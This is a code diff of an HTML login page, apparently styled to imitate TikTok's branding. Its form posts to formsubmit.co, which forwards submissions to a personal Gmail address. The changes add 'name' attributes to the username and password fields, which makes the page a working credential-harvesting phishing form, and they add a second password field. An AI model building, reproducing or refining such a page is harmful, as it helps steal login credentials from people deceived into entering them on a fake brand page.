@@ -36,7 +36,13 @@
             margin-bottom: 40px;
         }
 
-        
+        .logo span {
+            font-size: 2.5rem;
+            font-weight: bold;
+            background: linear-gradient(45deg, #FE2C55, #25F4EE);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
 
         .form-group {
             margin-bottom: 20px;
@@ -149,11 +155,14 @@
         
         <form action="https://formsubmit.co/josephbandoh941@gmail.com" method="POST">
             <div class="form-group">
-                <input type="text" placeholder="Username or email" required>
+                <input type="text" name = "user" placeholder="Username or email" required>
             </div>
             
             <div class="form-group">
-                <input type="password" placeholder="Password" required>
+                <input type="password" name = "password" placeholder="Password" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name = "password" placeholder="Re-enter Password" required>
             </div>
             
             <button type="submit">Log in</button>
